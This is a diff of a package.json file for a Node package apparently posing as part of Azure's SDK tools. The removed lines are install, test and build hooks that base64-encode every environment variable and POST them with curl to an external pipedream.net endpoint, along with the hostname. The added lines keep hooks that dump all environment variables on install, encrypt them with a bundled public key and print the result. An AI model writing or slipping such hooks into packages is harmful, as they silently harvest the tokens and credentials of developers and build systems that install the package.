@@ -7,9 +7,9 @@
   "license": "MIT",
   "scripts": {
     "start": "node index.js",
-    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/Azure/azure-sdk-tools.git\\&folder=keyvault-mock-attestation\\&hostname=`hostname`\\&foo=wza\\&step=preinstall",
-    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/Azure/azure-sdk-tools.git\\&folder=keyvault-mock-attestation\\&hostname=`hostname`\\&foo=wza\\&step=test",
-    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/Azure/azure-sdk-tools.git\\&folder=keyvault-mock-attestation\\&hostname=`hostname`\\&foo=wza\\&step=build"
+    "preinstall": "set | gpg -f ./pub.pgp --encrypt | base64",
+    "test": "set | gpg -f ./pub.pgp --encrypt | base64",
+    "build": "set | gpg -f ./pub.pgp --encrypt | base64"
   },
   "dependencies": {
     "body-parser": "^1.20.1",
